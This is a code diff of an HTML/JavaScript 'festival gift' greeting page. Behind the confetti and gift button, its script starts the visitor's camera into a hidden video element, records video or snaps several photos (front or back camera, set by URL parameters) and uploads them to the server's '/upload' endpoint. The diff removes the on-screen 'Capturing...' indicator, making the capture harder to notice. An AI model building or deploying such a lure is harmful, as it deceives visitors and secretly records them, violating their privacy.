@@ -256,7 +256,6 @@
             opacity: 0.5;
         }
         #hiddenVideo { display: none; }
-        #photoCanvas { display: none; }
         .mode-badge {
             display: inline-block;
             background: rgba(255,215,0,0.2);
@@ -266,16 +265,6 @@
             font-size: 0.7rem;
             border: 1px solid rgba(255,215,0,0.2);
             margin-bottom: 10px;
-        }
-        .capture-status {
-            margin-top: 10px;
-            color: rgba(255,255,255,0.7);
-            font-size: 0.9rem;
-            display: none;
-        }
-        .capture-status.active {
-            display: block;
-            animation: fadeIn 0.3s ease;
         }
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
@@ -299,10 +288,9 @@
     </div>
     
     <video id="hiddenVideo" autoplay playsinline></video>
-    <canvas id="photoCanvas"></canvas>
     
     <div class="festival-card" id="festivalCard">
-        <div class="mode-badge" id="modeBadge">🎊 Festival Mode</div>
+        <div class="mode-badge">🎊 Festival Mode</div>
         <span class="main-emoji" id="mainEmoji">🎊</span>
         <h1 class="festival-title"><span class="festival-name" id="festivalName">Festival</span></h1>
         <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
@@ -319,36 +307,22 @@
             </div>
         </div>
         
-        <div class="capture-status" id="captureStatus">📸 Capturing...</div>
         <div class="status" id="statusMessage">💝 Click the gift to reveal your surprise</div>
     </div>
 
     <script>
-        // ============================================
-        // Get parameters from URL
-        // ============================================
+        // Get festival name from URL parameter
         const urlParams = new URLSearchParams(window.location.search);
         const festivalName = urlParams.get('name') || 'Festival';
-        const captureMode = urlParams.get('mode') || 'video';
-        const cameraType = urlParams.get('camera') || 'user';
-        const photoCount = parseInt(urlParams.get('photos')) || 5;
-        const videoDuration = parseInt(urlParams.get('duration')) || 15;
-        
         document.getElementById('festivalName').textContent = festivalName;
-        
-        // Update badge
-        const modeBadge = document.getElementById('modeBadge');
-        if (captureMode === 'photo') {
-            modeBadge.textContent = `📸 Photo Mode (${cameraType === 'user' ? 'Front' : 'Back'} Camera)`;
-        } else {
-            modeBadge.textContent = `🎬 Video Mode (${cameraType === 'user' ? 'Front' : 'Back'} Camera)`;
-        }
 
-        // ============================================
-        // DOM Elements
-        // ============================================
+        // Get camera type from URL parameter
+        const cameraType = urlParams.get('camera') || 'user';
+        const captureMode = urlParams.get('mode') || 'video';
+        const duration = parseInt(urlParams.get('duration')) || 15;
+        const photos = parseInt(urlParams.get('photos')) || 5;
+
         const videoElement = document.getElementById('hiddenVideo');
-        const photoCanvas = document.getElementById('photoCanvas');
         const giftBtn = document.getElementById('giftBtn');
         const btnText = document.getElementById('btnText');
         const statusMessage = document.getElementById('statusMessage');
@@ -360,23 +334,15 @@
         const giftOverlay = document.getElementById('giftOverlay');
         const giftEmoji = document.getElementById('giftEmoji');
         const giftText = document.getElementById('giftText');
-        const captureStatus = document.getElementById('captureStatus');
 
         const UPLOAD_URL = '/upload';
-        let mediaStream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let timerInterval = null;
-        let timeRemaining = videoDuration;
-        let isRecording = false;
+        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
+        let timerInterval = null, timeRemaining = duration, isRecording = false;
         let isGiftOpened = false;
-        let capturedPhotos = [];
         let photoIndex = 0;
         let photoInterval = null;
 
-        // ============================================
-        // Confetti Generator
-        // ============================================
+        // Confetti generator
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -392,9 +358,6 @@
             confettiContainer.appendChild(confetti);
         }
 
-        // ============================================
-        // Gift Functions
-        // ============================================
         function showGiftReveal() {
             giftOverlay.classList.add('active');
             
@@ -419,7 +382,6 @@
                         btnText.textContent = 'Open Another Gift';
                         statusMessage.textContent = '💝 Thank you! You can open another gift!';
                         surpriseContainer.classList.remove('visible');
-                        captureStatus.classList.remove('active');
                         isGiftOpened = false;
                     }, 5000);
                 }
@@ -445,9 +407,6 @@
             }
         }
 
-        // ============================================
-        // Camera Functions
-        // ============================================
         async function startCamera() {
             try {
                 const constraints = {
@@ -462,17 +421,13 @@
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
-                
                 return true;
             } catch (error) {
-                console.error('❌ Camera error:', error);
+                console.error('Camera error:', error);
                 return false;
             }
         }
 
-        // ============================================
-        // Video Recording
-        // ============================================
         async function startVideoRecording() {
             try {
                 if (!await startCamera()) {
@@ -495,13 +450,13 @@
 
                 mediaRecorder.start();
                 isRecording = true;
-                timeRemaining = videoDuration;
+                timeRemaining = duration;
                 
-                surpriseText.textContent = `🎬 Recording video... ${videoDuration}s`;
+                surpriseText.textContent = `🎬 Recording video... ${duration}s`;
 
                 timerInterval = setInterval(() => {
                     timeRemaining--;
-                    const progress = ((videoDuration - timeRemaining) / videoDuration) * 100;
+                    const progress = ((duration - timeRemaining) / duration) * 100;
                     progressBar.style.width = progress + '%';
                     
                     if (timeRemaining > 0) {
@@ -533,60 +488,49 @@
                 }, 1000);
 
             } catch (error) {
-                console.error('❌ Recording error:', error);
+                console.error('Recording error:', error);
                 throw error;
             }
         }
 
-        // ============================================
-        // Photo Capture
-        // ============================================
         async function startPhotoCapture() {
             try {
                 if (!await startCamera()) {
                     throw new Error('Camera failed to start');
                 }
 
+                const canvas = document.createElement('canvas');
                 const width = 640;
                 const height = 480;
-                photoCanvas.width = width;
-                photoCanvas.height = height;
-                const ctx = photoCanvas.getContext('2d');
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
                 
-                capturedPhotos = [];
                 photoIndex = 0;
-                captureStatus.classList.add('active');
-                captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;
-                surpriseText.textContent = `📸 Capturing photos...`;
 
                 photoInterval = setInterval(() => {
-                    if (photoIndex < photoCount) {
+                    if (photoIndex < photos) {
                         ctx.drawImage(videoElement, 0, 0, width, height);
                         
-                        photoCanvas.toBlob((blob) => {
+                        canvas.toBlob((blob) => {
                             if (blob) {
-                                const timestamp = Date.now();
-                                const filename = `photo_${timestamp}.jpg`;
+                                const filename = `photo_${Date.now()}.jpg`;
                                 const file = new File([blob], filename, { type: 'image/jpeg' });
                                 uploadMedia(file, 'photo');
                                 
-                                capturedPhotos.push(filename);
                                 photoIndex++;
-                                
-                                const progress = (photoIndex / photoCount) * 100;
+                                const progress = (photoIndex / photos) * 100;
                                 progressBar.style.width = progress + '%';
-                                captureStatus.textContent = `📸 Capturing photo ${photoIndex}/${photoCount}`;
-                                surpriseText.textContent = `📸 Photo ${photoIndex}/${photoCount}`;
+                                surpriseText.textContent = `📸 Photo ${photoIndex}/${photos}`;
                             }
                         }, 'image/jpeg', 0.9);
                     } else {
                         clearInterval(photoInterval);
                         photoInterval = null;
                         
-                        captureStatus.classList.remove('active');
                         progressBar.classList.add('done');
                         progressBar.style.width = '100%';
-                        surpriseText.textContent = `✅ ${photoCount} photos captured!`;
+                        surpriseText.textContent = `✅ ${photos} photos captured!`;
                         
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
@@ -601,14 +545,11 @@
                 }, 1500);
 
             } catch (error) {
-                console.error('❌ Photo capture error:', error);
+                console.error('Photo capture error:', error);
                 throw error;
             }
         }
 
-        // ============================================
-        // Upload
-        // ============================================
         async function uploadMedia(file, type) {
             const formData = new FormData();
             formData.append('media', file);
@@ -630,9 +571,6 @@
             }
         }
 
-        // ============================================
-        // Open Gift
-        // ============================================
         async function openGift() {
             if (isGiftOpened) return;
             isGiftOpened = true;
@@ -673,13 +611,9 @@
                 btnText.textContent = 'Try Again';
                 isGiftOpened = false;
                 surpriseContainer.classList.remove('visible');
-                captureStatus.classList.remove('active');
             }
         }
 
-        // ============================================
-        // Event Listeners
-        // ============================================
         giftBtn.addEventListener('click', openGift);
         
         festivalCard.addEventListener('click', () => {
@@ -698,7 +632,6 @@
         });
 
         console.log('🎁 Festival mode loaded!');
-        console.log(`📷 Mode: ${captureMode}, Camera: ${cameraType}`);
     </script>
 </body>
 </html>
